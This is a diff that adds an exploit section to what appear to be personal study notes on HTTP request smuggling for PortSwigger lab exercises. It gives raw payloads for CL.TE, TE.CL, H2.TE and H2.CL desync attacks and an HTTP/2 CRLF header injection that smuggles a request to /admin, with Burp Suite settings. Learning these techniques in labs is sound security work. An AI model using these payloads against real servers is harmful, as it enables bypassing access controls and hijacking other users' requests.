@@ -37,6 +37,86 @@
         python smuggler.py -u <url>
         ```
 
+## Exploit
+
+1. CL.TE
+
+    - don't need to disable `Update Content-Length`
+    - simple payload:
+
+    ```http
+    POST /post/comment HTTP/1.1^M$
+    Content-Length: 6^M$
+    Transfer-Encoding: chunked^M$
+    ^M$
+    0^M$
+    ^M$
+    G
+    ```
+
+2. TE.CL
+
+    - disable `Update Content-Length`
+    - simple payload:
+
+    ```http
+    POST / HTTP/1.1^M$
+    Content-Length: 4^M$
+    Transfer-Encoding: chunked^M$
+    ^M$
+    29^M$
+    GPOST / HTTP/1.1^M$
+    Content-Length: 20^M$
+    ^M$
+    a^M$
+    0^M$
+    ^M$
+    ```
+
+    ```text
+    4 = len(29^M$)
+    29 = len(GPOST / HTTP/1.1^M$
+            Content-Length: 20^M$
+            ^M$
+            a)
+    ```
+
+3. H2.TE (frontend failed to delete TE header)
+    - payload:
+
+    ```http
+    POST / HTTP/2^M$
+    Host: id.web-security-academy.net^M$
+    Content-Type: application/x-www-form-urlencoded^M$
+    Transfer-Encoding: chunked^M$
+    ^M$
+    0^M$
+    ^M$
+    GET /notfoundforsure HTTP/1.1^M$
+    Host: id.web-security-academy.net^M$
+    ^M$
+    ```
+
+4. H2.CL (frontend failed to delete CL header)
+
+    ```http
+    POST / HTTP/2^M$
+    Host: id.web-security-academy.net^M$
+    Content-Type: application/x-www-form-urlencoded^M$
+    Content-Length: 0^M$
+    ^M$
+    smuggled
+    ```
+
+5. CRLF injection (\r\n in http2 header is downgraded to http1 as special characters)
+
+    |     |     |
+    | --- | --- |
+    | :method | GET |
+    | :path | /   |
+    | :authority | vulnerable-website.com |
+    | foo | bar\\r\\n<br />\\r\\n<br />GET /admin HTTP/1.1\\r\\n<br />Host: vulnerable-website.com |
+
 ## Working with HTTP/2 in burpsuite
 
 disable `Update Content-Length` and enable `Allow HTTP/2 ALPN override`
